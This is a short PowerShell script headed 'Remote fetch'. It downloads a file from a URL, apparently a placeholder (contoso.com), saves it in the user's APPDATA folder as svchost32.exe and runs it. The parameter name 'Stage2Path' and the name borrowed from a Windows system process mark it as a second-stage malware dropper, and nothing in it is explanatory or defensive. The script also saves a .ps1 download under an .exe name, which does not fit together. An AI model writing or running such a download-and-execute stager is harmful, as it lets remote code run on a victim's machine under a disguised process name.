
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$FetchUrl = "https://contoso.com/updater.ps1",
    [string]$Stage2Path = "$env:APPDATA\svchost32.exe"
)
(New-Object System.Net.WebClient).DownloadFile($FetchUrl, $Stage2Path)
Start-Process -FilePath $Stage2Path
Start-Sleep -Seconds 30
